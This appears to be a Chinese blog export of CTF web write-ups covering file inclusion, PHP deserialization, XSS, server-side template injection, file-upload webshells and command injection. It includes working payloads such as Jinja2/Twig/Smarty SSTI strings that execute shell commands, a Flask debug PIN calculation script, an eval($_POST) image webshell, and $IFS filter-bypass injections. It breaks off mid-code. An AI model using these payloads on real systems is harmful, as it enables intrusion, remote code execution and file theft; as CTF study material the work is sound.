highlight_file(__FILE__);&#125;?&gt;</code></pre><p><code>file_get_contents</code>：将整个文件读入一个字符串</p><p>首先传入<code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code>绕过第一个if</p><p>然后传入<code>file=php://filter/read=convert.base64-encode/resource=useless.php</code>读取<code>useless.php</code></p><p>base64解码后代码如下：</p><pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php  class Flag&#123;  &#x2F;&#x2F;flag.php      public $file;      public function __tostring()&#123;          if(isset($this-&gt;file))&#123;              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);        &#125;      &#125;  &#125;  ?&gt;  </code></pre><p>随后再传入<code>password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code>，包含<code>file=useless.php</code>即可得到flag</p><p>完整payload：</p><pre class="language-none"><code class="language-none">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;file&#x3D;useless.phppassword&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></pre><h4 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h4><p>请求<code>index.php?category=woofers&#39;</code>时得到<code>include</code>报错，并且<code>include</code>会字符串后面加上一个<code>.php</code></p><p>于是先用<code>php://filter</code>协议读一下<code>index.php</code>文件</p><p><code>php://filter/read=convert.base64-encode/resource=index</code>，解码得到入如下结果（舍去html元素）</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    $file &#x3D; $_GET[&#39;category&#39;];    if(isset($file))    &#123;                            if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;index&quot;))        &#123;                                    include ($file . &#39;.php&#39;);        &#125;else&#123;                                    echo &quot;Sorry, we currently only support woofers and meowers.&quot;;                            &#125;                    &#125;                ?&gt;</code></pre><p>要求<code>category</code>必须携带<code>woofers</code>或者<code>meowers</code>才能进行<code>include</code>操作，那么加上去就可以了</p><p>payload：<code>php://filter/read=convert.base64-encode/resource=woofers/../flag</code></p><p>解码得到flag</p><p>网上还有一种说法就是<code>php://filter</code>伪协议可以套一层协议，也就是这样</p><p><code>php://filter/read=convert.base64-encode/woofers/resource=flag</code></p><p>这样提交的参数既包含有woofers这个字符串，也不会影响正常的包含</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><p><a href="https://www.freebuf.com/articles/web/182280.html">Web安全实战系列：文件包含漏洞</a></p></li><li><p><a href="https://www.leavesongs.com/search/?keyword=filter">谈一谈php://filter的妙用</a></p></li><li><p><a href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结</a></p></li><li><p><a href="https://www.freebuf.com/column/148886.html">php伪协议实现命令执行的七种姿势</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-XSS</title>
      <link href="/posts/fb2051a0/"/>
      <url>/posts/fb2051a0/</url>
      
        <content type="html"><![CDATA[<h3 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a>[BJDCTF 2nd]xss之光</h3><p>存在<code>.git</code>源码泄露，GitHack得到源码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    $a &#x3D; $_GET[&#39;yds_is_so_beautiful&#39;];    echo unserialize($a);</code></pre><p>两行代码，根据题目名推测需要弹一个XSS弹窗，题目的代码没有类给我们构造反序列化条件，于是就需要利用<code>php</code>的原生类来进行操作</p><p>参考：<a href="http://blog.ydspoplar.top/2020/03/17/php%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E5%8E%9F%E7%94%9F%E7%B1%BB/">php可利用的原生类</a></p><p>题目<code>php</code>版本是<code>5.6.40</code>，于是利用<code>Exception</code>类来进行弹窗</p><pre class="language-php" data-language="php"><code class="language-php">$b &#x3D; new Exception(&quot;&lt;script&gt;window.location.href&#x3D;&#39;https:&#x2F;&#x2F;www.baidu.com&#39;&lt;&#x2F;script&gt;&quot;);echo urlencode(serialize($b));</code></pre><p>抓包返回头中就有flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SSTI</title>
      <link href="/posts/47d18edd/"/>
      <url>/posts/47d18edd/</url>
      
        <content type="html"><![CDATA[<p>先搬一张大佬的图：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200521204901527.png" alt loading="lazy"></p><a id="more"></a><h3 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h3><p>打开链接发现就一个这东西</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-81.png" alt loading="lazy"></p><p>懵了，于是购买writeup进行学习：</p><p>发现该题是一个利用“Python SSTI”,“404模板注入”的原理</p><p>题目类型深度剖析移步大佬的文章：<a href="https://www.freebuf.com/column/187845.html">从零学习flask模板注入</a></p><p>方法：</p><pre class="language-shell" data-language="shell"><code class="language-shell">在Python的SSTI中，大部分是依靠基类-&gt;子类-&gt;危险函数的方式来利用SSTI__class__  万物皆对象，而class用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为&lt;class &#39;str&#39;&gt;__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。__base__   以字符串返回一个类所直接继承的类。__bases__  以元组的形式返回一个类所直接继承的类。&#x2F;&#x2F; __base__和__mro__都是用来寻找基类的__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表，获取类的所有子类。__init__  类的初始化方法，所有自带带类都包含init方法，便于利用他当跳板来调用globals。__globals__  对包含函数全局变量的字典的引用，用于获取function所处空间下可使用的module、方法以及所有变量。</code></pre><p>解题步骤：</p><p>1、测试是否存在SSTI：</p><pre class="language-http" data-language="http"><code class="language-http">http:&#x2F;&#x2F;111.198.29.45:46675&#x2F;&#123;&#123;1+2&#125;&#125; </code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-82.png" alt loading="lazy"></p><p>事实证明存在SSTI</p><p>2、访问</p><pre class="language-http" data-language="http"><code class="language-http">http:&#x2F;&#x2F;111.198.29.45:46675&#x2F;&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</code></pre><p>来查看所有模块</p><p>3、os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置，为第59个（我眼瞎了，不要问我为什么）</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-83.png" style="zoom:80%;" loading="lazy"><p>4、访问</p><pre class="language-http" data-language="http"><code class="language-http">http:&#x2F;&#x2F;111.198.29.45:46675&#x2F;&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()&#125;&#125;</code></pre><p>查看catch_warnings模块都存在哪些全局函数，可以找到linecache函数，os模块就在其中</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-84.png" alt loading="lazy"></p><p>5.使用<code>[&#39;o&#39;+&#39;s&#39;]</code>,可绕过对<code>os</code>字符的过滤，访问</p><pre class="language-http" data-language="http"><code class="language-http">http:&#x2F;&#x2F;111.198.29.45:46675&#x2F;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;)&#125;&#125;</code></pre><p>查看flag文件所在</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-85.png" alt loading="lazy"></p><p>6、访问</p><pre class="language-http" data-language="http"><code class="language-http">http:&#x2F;&#x2F;111.198.29.45:46675&#x2F;&#123;&#123;&quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;fl4g&quot;).read()&#125;&#125;</code></pre><p>可得到flag，如图所示</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-86.png" alt loading="lazy"></p><p><strong>writeup里的另外一种姿势：</strong></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-87.png" alt loading="lazy"></p><p><strong>另外，里面还有一种更骚的操作：</strong></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-88.png" alt loading="lazy"></p><p>这里用到了一个工具：<a href="https://github.com/epinna/tplmap">tplmap</a></p><p>一个扫描服务器端模板注入漏洞的开源工具 ，需要自取</p><p>附上OS文件目录的方法： <a href="https://www.runoob.com/python/os-file-methods.html">Python OS 文件/目录方法</a></p><h3 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="BJDCTF-2nd-fake google"></a>BJDCTF-2nd-fake google</h3><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200324100426394.png" alt loading="lazy"></p><p>随便输入测试后得到一以下结果，推测是SSTI</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200324100451322.png" alt loading="lazy"></p><p>F12打开后发现提示果然是SSTI</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200324100534466.png" alt loading="lazy"></p><p>测试后发现啥都没过滤，于是直接上payload：</p><p>payload1：</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cd ..;ls;cat flag&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>payload2：</p><pre class="language-python" data-language="python"><code class="language-python">&#123;&#123; config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat &#x2F;flag | base64&#39;).read()&#125;&#125;</code></pre><p>命令执行：</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>文件操作：</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;filename&#39;, &#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="护网杯 2018-easy_tornado"></a>护网杯 2018-easy_tornado</h3><p>题目界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200412112736253.png" alt loading="lazy"></p><p>url格式：<code>http://70c4e22b-ffb9-4933-b754-737df58fec82.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=766846dacf2bd89cde918d880dd30d77</code></p><p>根据提示<code>flag</code>在<code>/fllllllllllllag</code>中，<code>hints</code>为<code>md5(cookie_secret+md5(filename))</code></p><p>观察url后推测出其中的关系<code>filehash=md5(cookie_secret+md5(filename))</code></p><p>也就是说<code>filename</code>有了，只需要拿到<code>cookie_secret</code>再经过<code>md5</code>换算后传入即可得到<code>flag</code></p><p>一种方法，根据已有的<code>filename</code>和<code>filehash</code>爆破出<code>cookie_secret</code>值，当然这种方法爆破不知道爆破到什么时候去了，随手测试后发现当<code>filename</code>和<code>filehash</code>不对应的时候有一个error页面</p><p>url格式：<code>http://70c4e22b-ffb9-4933-b754-737df58fec82.node3.buuoj.cn/error?msg=Error</code></p><p>测试<code>error?msg=&#123;&#123;1&#125;&#125;</code>发现有回显，应该存在模板注入</p><p>百度<code>reader</code>发现是<code>Tornado</code>框架中的一个渲染模板</p><p>参考：<a href="https://xz.aliyun.com/t/2908">https://xz.aliyun.com/t/2908</a></p><p>通过<code>handler.application</code>可访问整个Tornado</p><p>通过<code>&#123;&#123;handler.application.settings&#125;&#125;</code>或者<code>&#123;&#123;handler.settings&#125;&#125;</code>就可获得<code>settings</code>中的<strong>cookie_secret</strong></p><p><code>/fllllllllllllag</code>md5加密后在前面加上<code>cookie_secret</code>再经过md5加密后的值再和<code>/fllllllllllllag</code>传入url中即可得到flag</p><h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="BJDCTF2020-The mystery of ip"></a>BJDCTF2020-The mystery of ip</h3><p>flag.php界面会回显ip，抓包改XFF头，成功伪造，</p><p>这里考的是smarty模板注入，</p><p>关于smarty的SSTI可以参考<a href="https://www.freebuf.com/column/219913.html">https://www.freebuf.com/column/219913.html</a></p><p>拿flag的payload：<code>X-Forwarded-For: &#123;&#123;system('cat /flag')&#125;&#125;</code></p><h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="BJDCTF2020-Cookie is so stable"></a>BJDCTF2020-Cookie is so stable</h3><p>首先在<code>flag.php</code>界面进行测试，<code>&#123;&#123;7*'7'&#125;&#125;</code>，返回49，那应该就是<code>Twig</code>模板了，直接给出<code>payload</code>：</p><p><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</code></p><h3 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h3><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200815223254907.png" alt loading="lazy"></p><p>可以看到这样界面所拥有的功能，加解密base64，并且输入不当会触发debug模式，也就是说这个debug没关，转到提示界面，html源码中存在一个小hint —&gt; <code>&lt;!-- PIN ---&gt;</code>，不出意外应该就是要获得这个PIN码来到debug界面进行命令执行操作了</p><p>结果测试在解密界面存在SSTI，既<code>&#123;&#123;7+7&#125;&#125;</code>输出结果14，于是尝试在这里进行命令执行或文件读取，fuzz后发现过滤了挺多东西了，诸如<code>import、popen、system、eval、flag</code>等关键字，但是可以进行文件读取</p><p>payload：</p><pre class="language-python" data-language="python"><code class="language-python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>base64编码后：</p><pre class="language-none"><code class="language-none">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignZmxhZy5waHAnLCAncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9</code></pre><p>传入可以看到<code>/etc/passwd</code>的内容</p><p>这时根据题目意思，获取PIN码</p><p>原理参考这篇博客：<a href="https://www.cnblogs.com/HacTF/p/8160076.html">Flask debug 模式 PIN 码生成机制安全性研究笔记</a></p><p>上脚本：</p><pre class="language-python" data-language="python"><code class="language-python">import hashlibfrom itertools import chainprobably_public_bits &#x3D; [    &#39;flaskweb&#39;,     # 服务器运行flask所登录的用户名。 通过&#x2F;etc&#x2F;passwd中可以猜测为flaskweb 或者root ，此处用的flaskweb    &#39;flask.app&#39;,    # modname 一般不变就是flask.app    &#39;Flask&#39;,        # getattr(app, &quot;__name__&quot;, app.__class__.__name__)  python该值一般为Flask 值一般不变    &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39;,   # flask库下app.py的绝对路径。通过报错信息就会泄露该值。本题的值为]private_bits &#x3D; [    # 当前网络的mac地址的十进制数。通过文件&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address 获取: print(int(&#39;02:42:ae:00:33:f5&#39;.replace(&#39;:&#39;, &#39;&#39;), 16))    &#39;2485410345973&#39;,    # 最后一个就是机器的id    # 对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i，有的系统没有这两个文件，    # windows的id获取跟linux也不同。    # 对于docker机则读取&#x2F;proc&#x2F;self&#x2F;cgroup    &#39;44547b3a0bae08513cd0bacbd2f23a304505e1051c10f267af9b86649a6e7c89&#39;]h &#x3D; hashlib.md5()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit &#x3D; bit.encode(&#39;utf-8&#39;)    h.update(bit)h.update(b&#39;cookiesalt&#39;)cookie_name &#x3D; &#39;__wzd&#39; + h.hexdigest()[:20]num &#x3D; Noneif num is None:    h.update(b&#39;pinsalt&#39;)    num &#x3D; (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]rv &#x3D;Noneif rv is None:    for group_size in 5, 4, 3:        if len(num) % group_size &#x3D;&#x3D; 0:            rv &#x3D; &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)                          for x in range(0, len(num), group_size))            break    else:        rv &#x3D; numprint(rv)</code></pre><p>随后得到PIN码，到debug界面用shell执行代码：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200815224222481.png" alt loading="lazy"></p><p>得到flag</p><p><strong>参考</strong></p><ul><li><a href="https://www.cnblogs.com/MisakaYuii-Z/p/12407760.html">记一次Flask模板注入学习 [GYCTF2020]FlaskApp</a></li><li><a href="https://www.cnblogs.com/HacTF/p/8160076.html">Flask debug 模式 PIN 码生成机制安全性研究笔记</a></li><li><a href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门</a></li><li><a href="https://xz.aliyun.com/t/6885">Python模板注入(SSTI)深入学习</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-文件上传</title>
      <link href="/posts/592e5fba/"/>
      <url>/posts/592e5fba/</url>
      
        <content type="html"><![CDATA[<h3 id="2019SUCTF—CheckIn"><a href="#2019SUCTF—CheckIn" class="headerlink" title="2019SUCTF—CheckIn"></a>2019SUCTF—CheckIn</h3><p>题目源码：<a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn">https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn</a></p><p>复现链接：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p><a id="more"></a><h4 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h4><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209103925041.png" alt loading="lazy"></p><p>上传一句话.php文件，结果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209104816676.png" alt loading="lazy"></p><p>更改后缀和文件类型为图片格式，结果如下，过滤了<code>&lt;?</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209105358989.png" alt loading="lazy"></p><p>用<code>&lt;script language=&#39;php&#39;&gt;&lt;scirpt&gt;</code>类型的图片马绕过，结果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209105253270.png" alt loading="lazy"></p><p>应该调用了后端的<code>exif_imagetype()</code>函数，于是添加文件头绕过<code>GIF89a</code>，上传成功</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209110003787.png" alt loading="lazy"></p><p>到这一步应该想到上传一个<code>.htaccess</code>文件来将图片马解析为php，尝试无果，于是用到了下面的.user.ini文件</p><p>参考</p><blockquote><p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">user.ini文件构成的PHP后门</a></p><p><a href="https://xz.aliyun.com/t/6091#toc-1">从SUCTF 2019 CheckIn 浅谈.user.ini的利用</a></p></blockquote><h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><h5 id="上传-uesr-ini文件"><a href="#上传-uesr-ini文件" class="headerlink" title="上传.uesr.ini文件"></a>上传.uesr.ini文件</h5><p>内容如下：</p><pre class="language-ini" data-language="ini"><code class="language-ini">GIF89aauto_prepend_file&#x3D;a.jpg</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209104439117.png" alt loading="lazy"></p><blockquote><p>ini文件设置中有两个参数：<code>auto_prepend_file</code>和<code>auto_append_file</code></p><p>表示我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：<code>require(./a.jpg);</code></p><p>两个设置的区别在于<strong>auto_prepend_file</strong>是在文件前插入；<strong>auto_append_file</strong>在文件最后插入（当文件调用的有<code>exit()</code>时该设置无效）</p></blockquote><p>利用前提需要文件目录下有一个可执行的.php文件，而题目刚好有一个</p><h5 id="上传a-jpg图片马"><a href="#上传a-jpg图片马" class="headerlink" title="上传a.jpg图片马"></a>上传a.jpg图片马</h5><pre class="language-php" data-language="php"><code class="language-php">GIF89a&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;pass&#39;]);&lt;&#x2F;script&gt;</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209113304522.png" alt loading="lazy"></p><p>访问index.php，用工具连接后台，在网站根目录下得到flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209113410626.png" alt loading="lazy"></p><p>也可以将图片马代码改成如下方式</p><pre class="language-php" data-language="php"><code class="language-php">GIF89a&lt;script language&#x3D;&#39;php&#39;&gt;system(&#39;cat &#x2F;flag&#39;);&lt;&#x2F;script&gt;</code></pre><p>直接访问index.php即可得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-命令执行</title>
      <link href="/posts/c714e372/"/>
      <url>/posts/c714e372/</url>
      
        <content type="html"><![CDATA[<h3 id="2019GXYCTF-Ping-Ping-Ping"><a href="#2019GXYCTF-Ping-Ping-Ping" class="headerlink" title="2019GXYCTF-Ping Ping Ping"></a>2019GXYCTF-Ping Ping Ping</h3><p>12月份的GWYCTF，BUUCTF上复现</p><p>别人学校招新的题目，我还是不会，太菜了</p><a id="more"></a><p>先来看看题目的界面</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-96.png" alt loading="lazy"></p><p>由题意得，传参ip</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-97.png" alt loading="lazy"></p><p>联想命令执行，命令执行的方法大致两种：</p><pre class="language-shell" data-language="shell"><code class="language-shell">;：用于连续指令执行|：管道符，将左边的输出当做右边的输入，只返回右边的结果</code></pre><p>尝试分号：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-98.png" alt loading="lazy"></p><p>发现目录下包含两个文件：index.php 和 flag.php</p><p>尝试cat查看：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-99.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-100.png" alt loading="lazy"></p><p>emmmmmmmmmmmmm空格被办了。。。</p><p>从大佬那学习绕过空格的方法，大概有以下几种：</p><pre class="language-shell" data-language="shell"><code class="language-shell">$IFS$&#123;IFS&#125;$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行&lt; &lt;&gt; &#123;cat,flag.php&#125;  &#x2F;&#x2F;用逗号实现了空格功能%20 %09 </code></pre><p>各种尝试后发现$IFS$1有效，分别查看两个文件，如图：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-101.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-102.png" alt loading="lazy"></p><p>index.php代码如下：</p><pre class="language-php" data-language="php"><code class="language-php">&#x2F;?ip&#x3D;&#x2F;?ip&#x3D;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match))&#123;    echo preg_match(&quot;&#x2F;\&amp;|\&#x2F;|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match);    die(&quot;fxck your symbol!&quot;);  &#125; else if(preg_match(&quot;&#x2F; &#x2F;&quot;, $ip))&#123;    die(&quot;fxck your space!&quot;);  &#125; else if(preg_match(&quot;&#x2F;bash&#x2F;&quot;, $ip))&#123;    die(&quot;fxck your bash!&quot;);  &#125; else if(preg_match(&quot;&#x2F;.*f.*l.*a.*g.*&#x2F;&quot;, $ip))&#123;    die(&quot;fxck your flag!&quot;);  &#125;  $a &#x3D; shell_exec(&quot;ping -c 4 &quot;.$ip);  echo &quot;&quot;;  print_r($a);&#125;?&gt; </code></pre><p>发现大多数符号都被过滤，以下几种方法都不行（不过好像都挺有用的，搬来学习一下）：</p><pre class="language-shell" data-language="shell"><code class="language-shell">cat fl* 利用*匹配任意 不行echo &quot;Y2F0IGZsYWcucGhw&quot;| base64 -d | bash 也不行ca\t fl\ag.php 不行cat fl&#39;&#39;ag.php 不行</code></pre><p>最后使用变量拼接：</p><p>顾名思义，变量拼接就是：a=f;b=lag.php;cat $a$b</p><p>利用到解题中：</p><pre class="language-shell" data-language="shell"><code class="language-shell">a&#x3D;g;cat$IFS$1fla$a.php</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-103.png" alt loading="lazy"></p><p>[・_・?]</p><p>F12即可得出答案：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-104.png" alt loading="lazy"></p><p>参考大佬原文：<a href="https://www.jianshu.com/p/fd7f9fcc9333">ping</a></p><h3 id="BJDCTF-2nd-duangShell"><a href="#BJDCTF-2nd-duangShell" class="headerlink" title="BJDCTF-2nd-duangShell"></a>BJDCTF-2nd-duangShell</h3><p>首先首页提示</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200327192750978.png" alt loading="lazy"></p><p>.swp源码泄露，是使用vim编辑器的缓存文件</p><p>于是访问<code>url/.index.php.swp</code>下载该文件，然后用<code>vim -r index.php.swp</code>恢复文件，得到源码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;    &lt;title&gt;give me a girl&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;    &lt;center&gt;&lt;h1&gt;珍爱网&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?phperror_reporting(0);echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;if (!isset($_POST[&#39;girl_friend&#39;])) &#123;    die(&quot;where is P3rh4ps&#39;s girl friend ???&quot;);&#125; else &#123;    $girl &#x3D; $_POST[&#39;girl_friend&#39;];    if 